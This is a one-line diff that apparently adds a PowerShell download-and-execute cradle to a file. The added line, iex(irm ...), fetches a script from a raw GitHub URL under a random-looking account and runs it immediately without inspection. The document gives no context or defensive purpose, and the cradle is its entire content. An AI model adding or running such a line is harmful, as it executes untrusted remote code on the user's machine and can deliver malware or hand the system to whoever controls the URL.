@@ -1,0 +1,1 @@
+iex(irm https://raw.githubusercontent.com/9w3h8h4hw98dhf/8457hg/refs/heads/main/test/test1.ps1 -UseBasicParsing)
